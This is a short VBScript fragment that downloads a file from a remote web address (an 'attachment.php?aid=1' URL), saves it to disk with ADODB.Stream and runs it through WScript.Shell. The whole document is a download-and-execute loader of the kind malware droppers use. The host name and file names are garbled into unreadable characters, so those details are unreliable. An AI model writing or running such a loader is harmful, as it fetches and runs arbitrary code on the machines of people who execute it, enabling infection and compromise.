Set xPost = createObject("Microsoft.XMLHTTP") 
xPost.Open "GET","http://����������������������/attachment.php?aid=1",0 
xPost.Send() 
Set sGet = createObject("ADODB.Stream") 
sGet.Mode = 3 
sGet.Type = 1 
sGet.Open() 
sGet.Write(xPost.responseBody) 
sGet.SaveToFile "�������",2
Set run = createObject("wscript.shell")
run.run "�������",3